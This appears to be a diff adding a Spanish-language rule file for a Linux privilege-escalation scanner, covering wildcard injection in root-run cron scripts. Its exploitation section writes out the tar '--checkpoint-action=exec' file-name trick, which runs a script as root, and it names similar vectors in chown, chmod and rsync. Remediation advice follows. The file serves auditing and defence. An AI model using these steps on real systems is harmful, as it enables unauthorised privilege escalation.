@@ -1,0 +1,38 @@
+id: wildcard-injection
+title: "Wildcard injection en script ejecutado por root"
+category: cron
+vector: wildcard
+severity: high
+tier: B
+reaches_root: true
+validator: list_items
+
+match:
+  all:
+    - path: wildcards.candidates
+      not_empty: true
+
+params:
+  list_path: wildcards.candidates
+  target_field: script
+  status: potential
+  evidence_fields: [script, line, program, text]
+
+step: "{target} corre como root y usa un comodín `*` con {program}; crear archivos con nombres que se interpreten como flags -> ejecución como root."
+
+exploitation_steps: |
+  No verificado (Tier B). Ejemplo con `tar czf backup.tgz *` en un directorio
+  escribible:
+     touch -- '--checkpoint=1'
+     touch -- '--checkpoint-action=exec=sh runme.sh'
+     echo 'id > /tmp/o' > runme.sh
+  Cuando root corra el tar, ejecutará runme.sh como root.
+  Vectores análogos con `chown`/`chmod` (--reference=) y `rsync` (-e).
+
+remediation: |
+  Usar rutas explícitas en vez de `*` (`tar ... ./`), o `--` antes de los
+  argumentos, o `find ... -print0 | xargs -0`. Ejecutar el script desde un
+  directorio que los usuarios no puedan poblar.
+
+references:
+  - https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
